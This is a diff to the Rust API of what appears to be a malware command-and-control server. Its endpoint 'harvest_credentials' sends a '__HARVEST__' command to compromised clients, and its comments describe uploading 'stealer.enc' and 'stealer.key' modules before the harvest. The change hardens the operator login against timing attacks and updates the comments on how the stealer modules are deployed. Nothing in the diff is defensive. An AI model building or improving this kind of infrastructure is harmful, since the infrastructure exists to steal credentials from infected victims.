@@ -203,9 +203,9 @@ pub async fn harvest_credentials(
         return Err(StatusCode::UNAUTHORIZED);
     }
     
-    // Note: The main server handles uploading stealer.enc and stealer.key
-    // This is a simplified version - the full implementation would need
-    // to coordinate with the main server's module system
+    // TODO: Full implementation should coordinate with the main server's module system
+    // to upload stealer.enc and stealer.key before sending the harvest command.
+    // Currently sends __HARVEST__ directly which requires modules to be pre-deployed.
     match state.send_command(id, "__HARVEST__".to_string()).await {
         Ok(_) => Ok(Json(CommandResponse {
             success: true,
@@ -316,8 +316,10 @@ pub async fn login(
     State(state): State<Arc<ApiState>>,
     Json(request): Json<LoginRequest>,
 ) -> Json<LoginResponse> {
-    // Simple password check - in production, use proper authentication
-    if request.password == state.api_password {
+    // Use constant-time comparison to prevent timing attacks
+    let password_match = constant_time_compare(request.password.as_bytes(), state.api_password.as_bytes());
+    
+    if password_match {
         let token = state.create_token(request.username.clone()).await;
         Json(LoginResponse {
             success: true,
@@ -331,6 +333,19 @@ pub async fn login(
             message: "Invalid credentials".to_string(),
         })
     }
+}
+
+/// Constant-time comparison to prevent timing attacks
+fn constant_time_compare(a: &[u8], b: &[u8]) -> bool {
+    if a.len() != b.len() {
+        return false;
+    }
+    
+    let mut result = 0u8;
+    for (x, y) in a.iter().zip(b.iter()) {
+        result |= x ^ y;
+    }
+    result == 0
 }
 
 /// Logout and invalidate token
